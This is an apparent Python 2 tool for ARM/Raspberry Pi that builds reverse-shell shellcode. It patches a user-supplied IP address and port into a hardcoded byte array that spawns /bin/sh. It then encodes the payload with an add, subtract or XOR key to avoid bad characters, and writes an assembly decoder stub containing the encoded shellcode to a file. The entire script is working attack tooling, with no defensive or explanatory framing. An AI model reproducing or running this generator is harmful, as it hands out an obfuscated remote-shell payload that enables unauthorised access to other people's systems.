#Author: Mucahid KIR
#Website: mucoze.com
#Version: 0.1

#!/usr/bin/env python2

RED = "\033[31m"  
RESET = "\033[0m" 
bad_characters = ['0x20', '0x00', '0x0a', '0x0d']

ip=raw_input('Input a IP address, please : ');
port=int(raw_input('Input a PORT number, please (>256) :'));
ip=ip.split('.')

if port>255 and port<4096:
	p2=str(hex(port)[3:5])
	p1=str(hex(port)[2:3])
elif port>4095 and port<65536:
	p2=str(hex(port)[4:6])
	p1=str(hex(port)[2:4])
else:
	print("Invalid port number!")
	exit();


reverse  = [0x01,0x30,0x8f,0xe2,0x13,0xff,0x2f]
reverse += [0xe1,0x02,0x20,0x01,0x21,0x52,0x40]
reverse += [0x64,0x27,0xb5,0x37,0x01,0xdf,0x04]
reverse += [0x1c,0x0a,0xa1,0x4a,0x70,0x10,0x22]
reverse += [0x02,0x37,0x01,0xdf,0x20,0x1c,0x49]
reverse += [0x40,0x3f,0x27,0x01,0xdf,0x20,0x1c]
reverse += [0x01,0x31,0x01,0xdf,0x20,0x1c,0x01]
reverse += [0x31,0x01,0xdf,0x04,0xa0,0x49,0x40]
reverse += [0x52,0x40,0xc2,0x71,0x0b,0x27,0x01]
reverse += [0xdf,0x02,0xaa,0x13,0x37,0xc0,0xa8]
reverse += [0x08,0x8e,0x2f,0x62,0x69,0x6e,0x2f]
reverse += [0x73,0x68,0x58]


reverse[66]=int(p1, 16)
reverse[67]=int(p2, 16)	
reverse[68]=int(ip[0])
reverse[69]=int(ip[1])
reverse[70]=int(ip[2])
reverse[71]=int(ip[3])


def encoder_add(a):
	encoded = ""	
	for i in bytearray(reverse):
		x = int(i+a) & 0xff 
		encoded += '0x'
		encoded += '%02x,' % x
	return encoded;
def encoder_sub(a):
        encoded = ""
        for i in bytearray(reverse):
		x = int(i-a) & 0xff
                encoded += '0x'
                encoded += '%02x,' % x
        return encoded;

def encoder_or(a):
        encoded = ""
        for i in bytearray(reverse):
		x = int(i^a) & 0xff
                encoded += '0x'
                encoded += '%02x,' % x
        return encoded;


print(RED)
v=int(raw_input('\n\t1. Addition encode\n\t2. Subtraction encode\n\t3. XOR encode\n\n'+RESET+'Select encode type : '));

if v==1:
	a=int(raw_input('input ADD value : '));
	encoded=encoder_add(a);
elif v==2:
	a=int(raw_input('input SUB value : '));
	encoded=encoder_sub(a);
elif v==3:
	a=int(raw_input('input XOR value : '));
	encoded=encoder_or(a);
else:
	print("Invalid selection\n")
	exit()

encoded=encoded[:399]

print("\n");


d1 = """.global _start

_start:

  mov r6, #80        @ size of the shellcode

  mov r1, pc         @ move into r1 the pc

  add r1, #44        @ address of the shellcode

  sub r4, r4, r4     @ index for the loop

  sub sp, #80        @ save space for the decoded shellcode

		     @ save address of the decoded shellcode into r3
  add r3, sp, r4
	             @  mov r3, sp

start:

  ldrb r7, [r1, r4]  @ store into r2 the byte at the location (r1 + r4)"""
d2 = """

  """
if v==1:
	d3="sub r7, "
elif v==2:
	d3="add r7, "
elif v==3:
	d3="eor r7, r7, "


 
d4 = "#" 
d5 = str(a) 
d6 = """

  """
  
 
d7 = """strb r7, [r3, r4]  @ save the decoded byte into the allocated memory

  add r4, #1         @ increment the index by 1

  subs r5, r6, r4    @ check the index with the size of the shellcode

  bgt start          @ jump to start if r6>r4

end:

  add sp, #88        @ add 56 to the sp

  blx r3             @ jmp to the allocated area

  shellcode: .byte """+encoded

decoder = d1+d2+d3+d4+d5+d6+d7 

dosya = open('/home/pi/rshell.s','w')
dosya.write(decoder)
dosya.close()


